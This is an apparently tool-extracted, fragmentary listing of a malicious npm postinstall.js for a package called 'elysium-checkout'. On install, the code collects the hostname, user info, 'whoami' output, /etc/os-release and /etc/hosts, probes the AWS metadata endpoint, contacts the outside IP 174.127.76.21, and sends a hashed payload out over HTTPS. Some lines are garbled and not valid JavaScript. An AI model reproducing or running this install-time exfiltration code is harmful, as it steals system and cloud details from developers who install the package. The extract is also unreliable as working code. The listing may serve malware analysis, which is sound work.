// File: tmp/tmp4ua_qhsl/elysium-checkout/package/postinstall.js
// ======================================================================
Line 1: const https = require("https")
Line 2: const os = require("os")
Line 3: const fs = require("fs")
Line 4: const crypto = require("crypto")
Line 5: _tmp_2 = require("child_process")
Line 14: os.hostname()
Line 15: os.platform()
Line 17: os.arch()
Line 19: os.userInfo()
Line 22: os.totalmem()
Line 30: _tmp_7.execPath = process.execPath
Line 38: execSync("whoami").toString().trim()
Line 47: osRelease = fs.readFileSync("/etc/os-release", "utf-8")
Line 56: etcHostsContent = fs.readFileSync("/etc/hosts", "utf-8")
Line 63: {
  const metadataOptions = {
    hostname: "169.254.169.254",
    path: "/latest/meta-data/",
    method: "GET",
    timeout: 2000
  };
  const metadataReq = https.request(metadataOptions, (res) => {
    let data = "";
    res.on("data", (chunk) => { data += chunk; });
    res.on("end", () => {
      awsMetadata = data || "No metadata returned";
    });
  });
  metadataReq.on("error", (e) => {
    awsMetadata = `AWS metadata fetch failed: ${e.message}`;
  });
  metadataReq.end();
}
Line 70: const metadataReq = https.request(metadataOptions, (res) => {
    let data = "";
    res.on("data", (chunk) => { data += chunk; });
    res.on("end", () => {
      awsMetadata = data || "No metadata returned";
    });
  })
Line 78: awsMetadata = `AWS metadata fetch failed: ${e.message}`
Line 80: metadataReq.end()
Line 87: {
  const fetchOptions = {
    hostname: "174.127.76.21",
    path: "/checkout/resources/package.json",
    method: "GET",
    headers: {
      "User-Agent": process.env.npm_config_user_agent || "unknown"
    },
    timeout: 2000
  };
  const fetchReq = https.request(fetchOptions, (res) => {
    packageFetchInfo = `Fetched package.json, status: ${res.statusCode}`;
  });
  fetchReq.on("error", (e) => {
    packageFetchInfo = `Package fetch failed: ${e.message}`;
  });
  fetchReq.end();
}
Line 97: const fetchReq = https.request(fetchOptions, (res) => {
    packageFetchInfo = `Fetched package.json, status: ${res.statusCode}`;
  })
Line 101: packageFetchInfo = `Package fetch failed: ${e.message}`
Line 103: fetchReq.end()
Line 105: packageFetchInfo = `Package fetch attempt failed: ${e.message}`
Line 116: _tmp_13.executionId = crypto.randomUUID()
Line 121: generateHash(payloadWithoutHash)
Line 135: _tmp_16.X-Execution-Id = payload.executionId
Line 139: const req = https.request(options, (res) => {
  res.on("data", () => {});
  res.on("end", () => {});
})
